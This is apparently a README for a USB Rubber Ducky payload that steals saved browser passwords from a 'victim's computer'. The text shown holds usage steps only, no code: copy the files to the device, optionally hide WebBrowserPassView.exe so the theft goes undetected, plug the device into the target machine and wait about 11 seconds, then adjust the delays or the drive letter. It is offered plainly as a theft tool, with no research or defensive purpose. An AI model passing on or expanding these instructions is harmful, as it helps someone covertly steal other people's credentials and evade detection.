# USB Rubber Ducky Password Stealer

Hi guys, this is a simple script, that i've made, to steal all passwords saved on computer(Chrome, Explorer, Mozilla ecc...), using the USB Rubber Ducky !

# INSTRUCTIONS

1)Put the files inside the folder "Password Stealer" into your USB Rubber Ducky 
#
2)(OPTIONAL) Hide the file WebBrowserPassView.exe to make all undetectable (I prefer to do this for comodity)
#
3)Now remove the USB and put it again into the victim's computer to start the Script (Wait when the script has finished - 11s)
#
4)(OPTIONAL) Correct the DELAYS, or the USB location (Default is D:\ but if you've other Disks/USBs, he can change) if you want, from the Open Source File
#
